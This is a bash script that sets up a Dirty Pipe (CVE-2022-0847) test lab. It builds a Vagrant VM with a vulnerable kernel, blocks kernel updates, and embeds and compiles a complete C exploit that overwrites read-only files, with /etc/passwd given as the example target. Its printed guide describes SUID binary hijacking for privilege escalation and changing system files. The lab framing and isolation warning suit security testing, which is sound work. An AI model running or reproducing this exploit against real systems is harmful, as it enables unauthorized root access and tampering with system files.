#!/bin/bash

# CVE-2022-0847 (Dirty Pipe) Vulnerable Environment Setup Script
# This script sets up multiple options for testing the vulnerability

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_banner() {
    echo -e "${BLUE}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                   CVE-2022-0847 Setup Script                ║"
    echo "║                      (Dirty Pipe)                           ║"
    echo "║                                                              ║"
    echo "║  Setting up vulnerable environments for security testing     ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_requirements() {
    echo -e "${YELLOW}Checking requirements...${NC}"
    
    # Check if running on macOS or Linux
    if [[ "$OSTYPE" == "darwin"* ]]; then
        echo "✅ Detected macOS"
        PLATFORM="macos"
    elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
        echo "✅ Detected Linux"
        PLATFORM="linux"
    else
        echo -e "${RED}❌ Unsupported platform: $OSTYPE${NC}"
        exit 1
    fi
    
    # Check for required tools
    local required_tools=("vagrant" "VBoxManage")
    local missing_tools=()
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -ne 0 ]; then
        echo -e "${RED}❌ Missing required tools: ${missing_tools[*]}${NC}"
        echo ""
        echo "Please install:"
        echo "  - VirtualBox: https://www.virtualbox.org/wiki/Downloads"
        echo "  - Vagrant: https://www.vagrantup.com/downloads"
        exit 1
    fi
    
    echo "✅ All requirements met"
}

setup_vagrant_environment() {
    echo -e "${YELLOW}Setting up Vagrant environment with vulnerable kernel...${NC}"
    
    # Create project directory
    local project_dir="dirty-pipe-lab"
    
    if [ -d "$project_dir" ]; then
        echo -e "${YELLOW}⚠️  Directory $project_dir already exists. Remove it? (y/N)${NC}"
        read -r response
        if [[ "$response" =~ ^[Yy]$ ]]; then
            rm -rf "$project_dir"
        else
            echo "Aborting setup"
            exit 1
        fi
    fi
    
    mkdir -p "$project_dir"
    cd "$project_dir"
    
    # Copy Vagrantfile
    cp ../Vagrantfile.vulnerable Vagrantfile
    
    # Copy exploit files
    cp ../*.c . 2>/dev/null || true
    cp ../info.sh . 2>/dev/null || true
    
    echo "✅ Environment setup complete in $(pwd)"
}

start_vagrant_vm() {
    echo -e "${YELLOW}Starting vulnerable VM...${NC}"
    
    echo "This will:"
    echo "  1. Download Ubuntu 20.04.3 with vulnerable kernel 5.11.x"
    echo "  2. Set up test environment with proper users and files"
    echo "  3. Compile all exploit programs"
    echo "  4. Prevent kernel updates to maintain vulnerability"
    echo ""
    echo -e "${YELLOW}Proceed? (y/N)${NC}"
    read -r response
    
    if [[ ! "$response" =~ ^[Yy]$ ]]; then
        echo "Setup cancelled"
        exit 0
    fi
    
    # Start VM
    vagrant up
    
    echo ""
    echo -e "${GREEN}✅ Vulnerable VM is ready!${NC}"
    echo ""
    echo "Connect to VM:"
    echo "  vagrant ssh"
    echo ""
    echo "Test vulnerability:"
    echo "  sudo su - testuser"
    echo "  cd /home/vagrant/exploits"
    echo "  ./test_dirtypipe"
}

download_additional_exploits() {
    echo -e "${YELLOW}Downloading additional exploit variants...${NC}"
    
    # Create exploits directory
    mkdir -p exploits
    cd exploits
    
    # Download original disclosure exploits
    echo "Downloading original exploits..."
    
    # Create a comprehensive exploit collection
    cat > advanced_exploit.c << 'EOF'
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static void prepare_pipe(int p[2])
{
    if (pipe(p)) abort();
    
    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];
    
    // Fill pipe buffer to set PIPE_BUF_FLAG_CAN_MERGE
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
    
    // Drain pipe buffer (flag should remain set due to bug)
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <target_file>\n", argv[0]);
        printf("Example: %s /etc/passwd\n", argv[0]);
        return 1;
    }
    
    const char *target_file = argv[1];
    printf("=== Advanced Dirty Pipe Exploit (CVE-2022-0847) ===\n");
    printf("Target file: %s\n", target_file);
    
    // Check if file exists and is readable
    int fd = open(target_file, O_RDONLY);
    if (fd < 0) {
        perror("Cannot open target file");
        return 1;
    }
    
    // Get file status
    struct stat st;
    if (fstat(fd, &st) < 0) {
        perror("fstat");
        close(fd);
        return 1;
    }
    
    printf("File size: %ld bytes\n", st.st_size);
    printf("File permissions: %o\n", st.st_mode & 0777);
    
    if (st.st_size < 10) {
        printf("Error: File too small for demonstration\n");
        close(fd);
        return 1;
    }
    
    // Prepare pipe
    int p[2];
    prepare_pipe(p);
    
    // Splice file data into pipe (starting at offset 1 to avoid null terminator issues)
    loff_t offset = 1;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    printf("splice() result: %zd\n", nbytes);
    
    if (nbytes <= 0) {
        printf("splice() failed\n");
        close(fd);
        close(p[0]);
        close(p[1]);
        return 1;
    }
    
    // Write malicious data
    const char *payload = "HACKED-BY-DIRTYPIPE";
    nbytes = write(p[1], payload, strlen(payload));
    printf("write() result: %zd\n", nbytes);
    
    close(fd);
    close(p[0]);
    close(p[1]);
    
    // Check if exploit worked
    printf("\nChecking if exploit succeeded...\n");
    FILE *f = fopen(target_file, "r");
    if (f) {
        char buffer[256];
        if (fgets(buffer, sizeof(buffer), f)) {
            printf("File content: %s", buffer);
            if (strstr(buffer, "HACKED")) {
                printf("\n🚨 SUCCESS! File was modified despite read-only permissions\n");
                printf("CVE-2022-0847 vulnerability CONFIRMED\n");
                fclose(f);
                return 0;
            }
        }
        fclose(f);
    }
    
    printf("❌ Exploit failed - file not modified\n");
    printf("Possible reasons:\n");
    printf("  - Kernel is patched\n");
    printf("  - File not in page cache\n");
    printf("  - Incorrect offset\n");
    return 1;
}
EOF

    gcc advanced_exploit.c -o advanced_exploit
    chmod +x advanced_exploit
    
    cd ..
    
    echo "✅ Additional exploits downloaded and compiled"
}

show_testing_guide() {
    echo -e "${GREEN}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                    Testing Instructions                      ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    echo "1. Start the vulnerable VM:"
    echo "   cd dirty-pipe-lab && vagrant up"
    echo ""
    echo "2. Connect to VM:"
    echo "   vagrant ssh"
    echo ""
    echo "3. Check kernel version (should be 5.11.x):"
    echo "   uname -r"
    echo ""
    echo "4. Switch to test user:"
    echo "   sudo su - testuser"
    echo ""
    echo "5. Run basic vulnerability test:"
    echo "   cd /home/vagrant/exploits"
    echo "   ./test_dirtypipe"
    echo ""
    echo "6. Test SUID binary hijacking:"
    echo "   ./exploit /tmp/suid_test"
    echo ""
    echo "7. Test arbitrary file overwrite:"
    echo "   ./advanced_exploit /tmp/readonly_test.txt"
    echo ""
    echo -e "${YELLOW}Expected results in vulnerable kernel:${NC}"
    echo "   ✅ Files should be overwritten despite read-only permissions"
    echo "   ✅ SUID binaries should be hijackable for privilege escalation"
    echo "   ✅ System files should be modifiable"
    echo ""
    echo -e "${RED}⚠️  WARNING: Only test on isolated VMs!${NC}"
    echo "   Never test on production systems!"
}

main() {
    print_banner
    
    echo "Select setup option:"
    echo "1) Set up Vagrant VM with vulnerable kernel (Recommended)"
    echo "2) Download additional exploit variants only"
    echo "3) Show testing guide"
    echo "4) Exit"
    echo ""
    echo -n "Enter choice [1-4]: "
    read -r choice
    
    case $choice in
        1)
            check_requirements
            setup_vagrant_environment
            start_vagrant_vm
            show_testing_guide
            ;;
        2)
            download_additional_exploits
            ;;
        3)
            show_testing_guide
            ;;
        4)
            echo "Exiting..."
            exit 0
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            exit 1
            ;;
    esac
}

# Run main function
main "$@" 